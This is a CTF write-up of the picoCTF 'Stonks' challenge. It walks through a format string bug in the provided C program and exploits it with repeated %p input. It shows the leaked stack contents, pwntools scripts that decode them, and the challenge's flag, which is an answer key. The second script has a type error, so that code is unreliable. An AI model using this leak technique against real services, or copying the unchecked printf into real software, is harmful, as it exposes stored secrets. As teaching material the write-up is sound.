---
title: "Stonks Picoctf Writeup"
date: 2023-08-03T23:20:55+02:00
author: l0w3
---

## Stonks PicoCTF

>I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!

This CTF is a basic PWN challenge from the picoCTF platform. We are only provided with a *vuln.c* file with a bunch of functions:

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = 'A' + (rand() % 26);
		} else {
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
```

It might seem scary at first, but it's not that hard, I prommisse. Let's break it down into smaller parts, starting from the `main` function.

```c
int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}
```
It let's us chose among two options: `buy`and `view` so let's analyize them:

### buy
```c
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```
As we analyse the code, there is something that immediately catches my eye, and that is the following line:

```c
printf(user_buf);
```
As we see, it's using the function `printf` without the typical `%s`to print strings. This leads to a `format string attack`. Those types of attacks allow us to leak data from the stack, and as we see on the first lines of the `buy` function, the flag is loaded onto the stack:

```c
char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
```
So, with that in mind, let's jump to exploit this

### Exploit Format string Attack

Format string attacks happen when we control the input to the `printf` and it has no format specified. Thus, we can send, for example `%p`as input and this will get interpreted and will print **the content of the direction on that pointer in hex and the direction will get incremented**.

Let's make a quick PoC:
```text
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p
Buying stonks with token:
0x89953d0
====SNIP====
```
See that `0x89953d0`? It's the content of a memory address, so, what would happen if we could print out as many addresses as we could? We could potentially get to the stack positions where the flag is stored, so let's try to put several `%p`

```text
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%
Buying stonks with token:
0x8dbb3d0-0x804b000-0x80489c3-0xf7f60d80-0xffffffff-0x1-0x8db9160-0xf7f6e110-0xf7f60dc7-(nil)-0x8dba180-0x1-0x8dbb3b0-0x8dbb3d0-0x6f636970-0x7b465443-0x306c5f49-0x345f7435-0x6d5f6c6c-0x306d5f79-0x5f79336e-0x62633763-0x65616336-0xffa0007d-0xf7f9baf8-0xf7f6e440-0x76848a00-0x1-(nil)-0xf7dfdce9-0xf7f6f0c0-0xf7f605c0-0xf7f60000-0xffa01f38-0xf7dee68d-0xf7f605c0-0x8048eca-0xffa01f44-(nil)-0xf7f82f09-0x804b000-0xf7f60000-0xf7f60e20-0xffa01f78-0xf7f88d50-0xf7f61890-0x76848a00-0xf7f60000-0x804b000-0xffa01f78-0x8048c86-0x8db9160-0xffa01f64-0xffa01f78-0x8048be9-0xf7f603fc-(nil)-0xffa0202c-0xffa02024-0x1-0x1-0x8db9160-0x76848a00-0xffa01f90-(nil)-(nil)-0xf7da3fa1-0xf7f60000-0xf7f60000-(nil)-0xf7da3fa1-0x1-0xffa02024-0xffa0202c-0xffa01fb4-0x1-(nil)-0xf7f60000-0xf7f8370a-0xf7f9b000-(nil)-0xf7f60000-(nil)-(nil)-0xfcdafc32-0x89b1a22-(nil)-(nil)-(nil)-0x1-0x8048630-(nil)-0xf7f88d50-0xf7f83960-0x804b000-0x1-0x8048630-(nil)-0x8048662-0x8048b85
```
Oh boy, seems like we leaked a lot of data. Trying to analyse that manually would be a pain, so let's script a simple python script to automate the memory analysis

```python
from pwn import *

mem = "0x8dbb3d0-0x804b000-0x80489c3-0xf7f60d80-0xffffffff-0x1-0x8db9160-0xf7f6e110-0xf7f60dc7-(nil)-0x8dba180-0x1-0x8dbb3b0-0x8dbb3d0-0x6f636970-0x7b465443-0x306c5f49-0x345f7435-0x6d5f6c6c-0x306d5f79-0x5f79336e-0x62633763-0x65616336-0xffa0007d-0xf7f9baf8-0xf7f6e440-0x76848a00-0x1-(nil)-0xf7dfdce9-0xf7f6f0c0-0xf7f605c0-0xf7f60000-0xffa01f38-0xf7dee68d-0xf7f605c0-0x8048eca-0xffa01f44-(nil)-0xf7f82f09-0x804b000-0xf7f60000-0xf7f60e20-0xffa01f78-0xf7f88d50-0xf7f61890-0x76848a00-0xf7f60000-0x804b000-0xffa01f78-0x8048c86-0x8db9160-0xffa01f64-0xffa01f78-0x8048be9-0xf7f603fc-(nil)-0xffa0202c-0xffa02024-0x1-0x1-0x8db9160-0x76848a00-0xffa01f90-(nil)-(nil)-0xf7da3fa1-0xf7f60000-0xf7f60000-(nil)-0xf7da3fa1-0x1-0xffa02024-0xffa0202c-0xffa01fb4-0x1-(nil)-0xf7f60000-0xf7f8370a-0xf7f9b000-(nil)-0xf7f60000-(nil)-(nil)-0xfcdafc32-0x89b1a22-(nil)-(nil)-(nil)-0x1-0x8048630-(nil)-0xf7f88d50-0xf7f83960-0x804b000-0x1-0x8048630-(nil)-0x8048662-0x8048b85"

mem = mem.split("-")
for direction in mem:
    if direction != "(nil)":
        print(p32(int(direction, 16)))
```

And this will produce the following result:

```text
b'\x01\x00\x00\x00'
b'\xb0\xb3\xdb\x08'
b'\xd0\xb3\xdb\x08'
b'pico'
b'CTF{'
b'I_l0'
b'5t_4'
b'll_m'
b'y_m0'
b'n3y_'
b'c7cb'
b'6cae'
b'}\x00\xa0\xff'
b'\xf8\xba\xf9\xf7'
b'@\xe4\xf6\xf7'
```
And there we go, you get the flag in there. We can edit a bit the script to get it more neately:

```python
from pwn import *

mem = "0x8dbb3d0-0x804b000-0x80489c3-0xf7f60d80-0xffffffff-0x1-0x8db9160-0xf7f6e110-0xf7f60dc7-(nil)-0x8dba180-0x1-0x8dbb3b0-0x8dbb3d0-0x6f636970-0x7b465443-0x306c5f49-0x345f7435-0x6d5f6c6c-0x306d5f79-0x5f79336e-0x62633763-0x65616336-0xffa0007d-0xf7f9baf8-0xf7f6e440-0x76848a00-0x1-(nil)-0xf7dfdce9-0xf7f6f0c0-0xf7f605c0-0xf7f60000-0xffa01f38-0xf7dee68d-0xf7f605c0-0x8048eca-0xffa01f44-(nil)-0xf7f82f09-0x804b000-0xf7f60000-0xf7f60e20-0xffa01f78-0xf7f88d50-0xf7f61890-0x76848a00-0xf7f60000-0x804b000-0xffa01f78-0x8048c86-0x8db9160-0xffa01f64-0xffa01f78-0x8048be9-0xf7f603fc-(nil)-0xffa0202c-0xffa02024-0x1-0x1-0x8db9160-0x76848a00-0xffa01f90-(nil)-(nil)-0xf7da3fa1-0xf7f60000-0xf7f60000-(nil)-0xf7da3fa1-0x1-0xffa02024-0xffa0202c-0xffa01fb4-0x1-(nil)-0xf7f60000-0xf7f8370a-0xf7f9b000-(nil)-0xf7f60000-(nil)-(nil)-0xfcdafc32-0x89b1a22-(nil)-(nil)-(nil)-0x1-0x8048630-(nil)-0xf7f88d50-0xf7f83960-0x804b000-0x1-0x8048630-(nil)-0x8048662-0x8048b85"

mem = mem.split("-")
flag = b""
for direction in mem:
    if direction != "(nil)":
        flag += p32(int(direction, 16))
idx = flag.find(b"picoCTF{")
fin = flag[idx:].find("}")+idx+1
print(flag[idx:fin])
```
And that's it, this will produce a beautiful output containing just our flag

`picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}``

### Conclusion

This was a quite easy PWN challenge and yet interesting, specially if you are getting into this type of challenges this is something you can manage to get familiar with it without the scary Assembly  (we will get to that soon, don't worry)
